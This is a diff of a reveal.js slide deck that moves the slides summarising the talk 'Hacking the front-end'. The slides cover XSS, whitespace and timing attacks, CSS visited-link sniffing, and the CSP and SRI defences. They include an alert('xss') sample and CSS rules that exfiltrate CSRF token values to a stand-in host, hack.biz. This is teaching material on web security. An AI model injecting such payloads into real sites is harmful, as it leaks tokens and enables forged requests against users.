@@ -432,6 +432,224 @@ var run = function () {
 				</section>
 
 
+				
+
+
+				<section>
+					<section data-markdown>
+						# [Hacking the front-end](https://www.youtube.com/watch?v=8Dh1guocIvs)
+
+						Alex Sexton
+					</section>
+
+					<section>
+						<h2>Security</h2>
+						<ul>
+							<li>Web developers != Security Researchers</li>
+							<li>Web security is hard</li>
+							<br>
+							<li class="fragment">For example:</li>
+						</ul>
+					</section>
+
+					<section>
+					<h2>Content Injection</h2>
+					<ul>
+						<li>Script, Images, PDFs...</li>
+						<li class="fragment">Detect malicious scripts?</li>
+						<pre class="fragment">
+						<code data-trim>
+&lt;ul&gt;
+  &lt;li&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&lt;/li&gt;
+&lt;/ul&gt;
+						</code>
+					</pre>
+						<li class="fragment">Not so easy</li>
+					</ul>
+					
+					<br>
+					<img class="fragment" src="imgs/UserAgent.png" alt="">
+
+					<aside class="notes">
+						<ul>
+							<li>Samy Worm example (myspace)</li>
+						</ul>
+					</aside>
+					</section>
+
+					<section>
+						<h3>White-space attack</h3>
+						<ul>
+							<li>Evaluation of 8-bit characters</li>
+						</ul>
+
+						<br>
+
+						<table>
+							<tr>
+								<td class="fragment"><img src="imgs/whitespace1.png" alt=""></td>
+								<td class="fragment"><img src="imgs/whitespace2.png" alt=""></td>
+							</tr>
+						</table>
+
+						<p class="fragment">Can not reliably detect malicious scripts</p>
+
+						<aside class="notes">
+							Billy Hoffman whitespace attack
+						</aside>
+					</section>
+
+					<section>
+						<h3>CSS Hack</h3>
+						<ul>
+							<li>Check for change of color of a link</li>
+							<li>Not Visited vs Visited</li>
+							<li>First fixed in Gecko:</li>
+						</ul>
+						<pre class="fragment">
+							<code data-trim>
+getComputedStyle(Link) === getComputedStyle(VisitedLink)
+							</code>
+						</pre>
+
+						<aside class="notes">
+							Applies in general, not only to link color
+						</aside>
+					</section>
+
+					<section>
+						<h3>Timing attacks</h3>
+						<ul>
+							<li>Security by inaccuracy</li>
+							<li>Previous example's fix can be worked around by checking the rendering time</li>
+						</ul>
+						<img src="imgs/renderTime.png" alt="" class="fragment">
+					</section>
+
+					<section>
+						<h3>Protect against all JS, Script tag injections, CSS hacks and all is good?</h3>
+
+						<aside class="notes">
+							<ul>
+								<li>Impossible</li>
+							</ul>
+						</aside>
+					</section>
+
+					<section>
+						<h3>CSRF Cookie attack</h3>
+						<pre>
+							<code data-trim>
+&lt;form&gt;
+   &lt;input type="hidden" class="csrf" value="0003"&gt;
+   ...
+&lt;/form&gt;
+							</code>
+						</pre>
+						<p>Prevents unwanted uses of forms in iframes</p>
+					</section>
+
+					<section>
+						<p>We can not sneak in any JS but we are allowed to style things with some custom CSS</p>
+
+						<pre>
+							<code data-trim>
+input.crsf[value="0001"] {
+  background-image: url(//hack.biz/0001.png);
+}
+							</code>
+						</pre>
+					</section>
+
+					<section>
+						<p>Enumerate multiple times</p>
+
+						<pre>
+							<code data-trim>
+input.crsf[value="0001"] {
+  background-image: url(//hack.biz/0001.png);
+}
+input.crsf[value="0002"] {
+  background-image: url(//hack.biz/0002.png);
+}
+input.crsf[value="0003"] {
+  background-image: url(//hack.biz/0003.png);
+}
+							</code>
+						</pre>
+
+						<p class="fragment">Enumerate e.g. 200mil. times and you have 200mil. attempts to figure out the crsf token</p>
+					</section>
+
+					<section>
+						<p>Trying to cover everything is not effective</p>
+					</section>
+
+					<section>
+						<h3>CSP - Content Security Policy</h3>
+						<pre>
+							<code data-trim>
+Content-Security-Policy:
+  default-src ...;
+  script-src ...;
+  object-src ...;
+  style-src ...;
+  img-src ...;
+  media-src ...;
+  frame-src ...;
+  font-src ...;
+  connect-src ...;
+  sandbox ...;
+  report-uri https://some.url/someone-is-hacking
+							</code>
+						</pre>
+					</section>
+
+					<section>
+						<h3>CSP - Content Security Policy</h3>
+						<ul>
+							<li>By default locks everything</li>
+							<li>By default</li>
+							<ul>
+								<li>Disallow inline JS, CSS</li>
+								<li>Disalow Eval</li>
+								<li>Disallow Cross Domain JS, CSS, Fonts, Imgs...</li>
+							</ul>
+							<li>Concept of white listing</li>
+						</ul>
+					</section>
+
+					<section>
+						<h3>Integration</h3>
+						<img src="imgs/helmet.png" alt="">
+					</section>
+
+					<section>
+						<h3>SRI - Sub Resource Integrity</h3>
+						<pre>
+							<code data-trim>
+&lt;script src="https://analytics-r-us.com/v1.0/include.js"
+  integrity = "ni:///sha-256;SDfwewFAE...wefjijfE?ct=application/javascript"&gt;&lt;/script&gt;
+							</code>
+						</pre>
+						<ol>
+							<li>Server sends a hash</li>
+							<li>Browser checks to make sure it gets the same answer</li>
+						</ol>
+						<p><a href="http://www.w3.org/TR/SRI/">http://www.w3.org/TR/SRI/</a></p>
+						<p><a href="https://www.srihash.org/">srihash.org</a></p>
+
+						<aside class="notes">
+							<ul>
+								<li>Pretty new</li>
+								<li>Still draft</li>
+								<li>Shipped in Chrome</li>
+							</ul>
+						</aside>
+					</section>
+
+				</section>
+
 				<section>
 					<section data-markdown>
 						<script type="text/template">
@@ -777,222 +995,6 @@ output = transduce(map(plus1), sum, 0, input);
 							* Supports async (push x pull)
 						</script>
 					</section>
-				</section>
-
-
-				<section>
-					<section data-markdown>
-						# [Hacking the front-end](https://www.youtube.com/watch?v=8Dh1guocIvs)
-
-						Alex Sexton
-					</section>
-
-					<section>
-						<h2>Security</h2>
-						<ul>
-							<li>Web developers != Security Researchers</li>
-							<li>Web security is hard</li>
-							<br>
-							<li class="fragment">For example:</li>
-						</ul>
-					</section>
-
-					<section>
-					<h2>Content Injection</h2>
-					<ul>
-						<li>Script, Images, PDFs...</li>
-						<li class="fragment">Detect malicious scripts?</li>
-						<pre class="fragment">
-						<code data-trim>
-&lt;ul&gt;
-  &lt;li&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&lt;/li&gt;
-&lt;/ul&gt;
-						</code>
-					</pre>
-						<li class="fragment">Not so easy</li>
-					</ul>
-					
-					<br>
-					<img class="fragment" src="imgs/UserAgent.png" alt="">
-
-					<aside class="notes">
-						<ul>
-							<li>Samy Worm example (myspace)</li>
-						</ul>
-					</aside>
-					</section>
-
-					<section>
-						<h3>White-space attack</h3>
-						<ul>
-							<li>Evaluation of 8-bit characters</li>
-						</ul>
-
-						<br>
-
-						<table>
-							<tr>
-								<td class="fragment"><img src="imgs/whitespace1.png" alt=""></td>
-								<td class="fragment"><img src="imgs/whitespace2.png" alt=""></td>
-							</tr>
-						</table>
-
-						<p class="fragment">Can not reliably detect malicious scripts</p>
-
-						<aside class="notes">
-							Billy Hoffman whitespace attack
-						</aside>
-					</section>
-
-					<section>
-						<h3>CSS Hack</h3>
-						<ul>
-							<li>Check for change of color of a link</li>
-							<li>Not Visited vs Visited</li>
-							<li>First fixed in Gecko:</li>
-						</ul>
-						<pre class="fragment">
-							<code data-trim>
-getComputedStyle(Link) === getComputedStyle(VisitedLink)
-							</code>
-						</pre>
-
-						<aside class="notes">
-							Applies in general, not only to link color
-						</aside>
-					</section>
-
-					<section>
-						<h3>Timing attacks</h3>
-						<ul>
-							<li>Security by inaccuracy</li>
-							<li>Previous example's fix can be worked around by checking the rendering time</li>
-						</ul>
-						<img src="imgs/renderTime.png" alt="" class="fragment">
-					</section>
-
-					<section>
-						<h3>Protect against all JS, Script tag injections, CSS hacks and all is good?</h3>
-
-						<aside class="notes">
-							<ul>
-								<li>Impossible</li>
-							</ul>
-						</aside>
-					</section>
-
-					<section>
-						<h3>CSRF Cookie attack</h3>
-						<pre>
-							<code data-trim>
-&lt;form&gt;
-   &lt;input type="hidden" class="csrf" value="0003"&gt;
-   ...
-&lt;/form&gt;
-							</code>
-						</pre>
-						<p>Prevents unwanted uses of forms in iframes</p>
-					</section>
-
-					<section>
-						<p>We can not sneak in any JS but we are allowed to style things with some custom CSS</p>
-
-						<pre>
-							<code data-trim>
-input.crsf[value="0001"] {
-  background-image: url(//hack.biz/0001.png);
-}
-							</code>
-						</pre>
-					</section>
-
-					<section>
-						<p>Enumerate multiple times</p>
-
-						<pre>
-							<code data-trim>
-input.crsf[value="0001"] {
-  background-image: url(//hack.biz/0001.png);
-}
-input.crsf[value="0002"] {
-  background-image: url(//hack.biz/0002.png);
-}
-input.crsf[value="0003"] {
-  background-image: url(//hack.biz/0003.png);
-}
-							</code>
-						</pre>
-
-						<p class="fragment">Enumerate e.g. 200mil. times and you have 200mil. attempts to figure out the crsf token</p>
-					</section>
-
-					<section>
-						<p>Trying to cover everything is not effective</p>
-					</section>
-
-					<section>
-						<h3>CSP - Content Security Policy</h3>
-						<pre>
-							<code data-trim>
-Content-Security-Policy:
-  default-src ...;
-  script-src ...;
-  object-src ...;
-  style-src ...;
-  img-src ...;
-  media-src ...;
-  frame-src ...;
-  font-src ...;
-  connect-src ...;
-  sandbox ...;
-  report-uri https://some.url/someone-is-hacking
-							</code>
-						</pre>
-					</section>
-
-					<section>
-						<h3>CSP - Content Security Policy</h3>
-						<ul>
-							<li>By default locks everything</li>
-							<li>By default</li>
-							<ul>
-								<li>Disallow inline JS, CSS</li>
-								<li>Disalow Eval</li>
-								<li>Disallow Cross Domain JS, CSS, Fonts, Imgs...</li>
-							</ul>
-							<li>Concept of white listing</li>
-						</ul>
-					</section>
-
-					<section>
-						<h3>Integration</h3>
-						<img src="imgs/helmet.png" alt="">
-					</section>
-
-					<section>
-						<h3>SRI - Sub Resource Integrity</h3>
-						<pre>
-							<code data-trim>
-&lt;script src="https://analytics-r-us.com/v1.0/include.js"
-  integrity = "ni:///sha-256;SDfwewFAE...wefjijfE?ct=application/javascript"&gt;&lt;/script&gt;
-							</code>
-						</pre>
-						<ol>
-							<li>Server sends a hash</li>
-							<li>Browser checks to make sure it gets the same answer</li>
-						</ol>
-						<p><a href="http://www.w3.org/TR/SRI/">http://www.w3.org/TR/SRI/</a></p>
-						<p><a href="https://www.srihash.org/">srihash.org</a></p>
-
-						<aside class="notes">
-							<ul>
-								<li>Pretty new</li>
-								<li>Still draft</li>
-								<li>Shipped in Chrome</li>
-							</ul>
-						</aside>
-					</section>
-
 				</section>
 
 				<section>
